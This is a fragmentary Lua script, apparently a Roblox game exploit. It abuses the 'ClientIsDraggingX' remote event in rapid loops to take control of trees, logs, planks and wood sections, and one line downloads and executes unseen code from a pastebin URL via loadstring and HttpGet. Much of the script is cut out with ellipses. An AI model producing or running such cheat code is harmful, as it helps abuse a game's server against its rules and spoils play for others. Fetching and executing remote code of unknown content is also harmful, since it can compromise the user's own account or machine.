...
game.ReplicatedStorage.Interaction.ClientIsDraggingX:FireServer(Tree)
end
end
end)
...
local clientIsDragging = game.ReplicatedStorage.Interaction.ClientIsDraggingX
        ...
        if Log.Name:sub(1, 6) == "Loose_" and Log:findFirstChild("Owner") then
            if Log.Owner.Value == game.Players.LocalPlayer then
                ...
                spawn(function()
                    for i=1,20 do
                        wait()
                        game.ReplicatedStorage.Interaction.ClientIsDraggingX:FireServer(Log)
                    end
                end)
            end
        end
		...
		if Plank.Name=="Plank" and Plank:findFirstChild("Owner") then
			if Plank.Owner.Value == game.Players.LocalPlayer then
				...
				spawn(function()
					for i=1,20 do
						wait()
						game.ReplicatedStorage.Interaction.ClientIsDraggingX:FireServer(Plank)
					end
				end)
			end
		end
...
loadstring(game:HttpGet('https://pastebin.com/raw/Qt1Ft45s',true))()
end)
...
for i,v in pairs(game.Workspace:GetDescendants()) do
    if v.Name == "WoodSection" and v.Parent:FindFirstChild("CutEvent") then
        game.ReplicatedStorage.Interaction.ClientIsDraggingX:FireServer(v.Parent)
...
game.Workspace.DescendantAdded:connect(function(Thing)
    ...
    if Thing.Name == "WoodSection" and Thing.Parent:FindFirstChild("CutEvent") then
        game.ReplicatedStorage.Interaction.ClientIsDraggingX:FireServer(Thing.Parent)
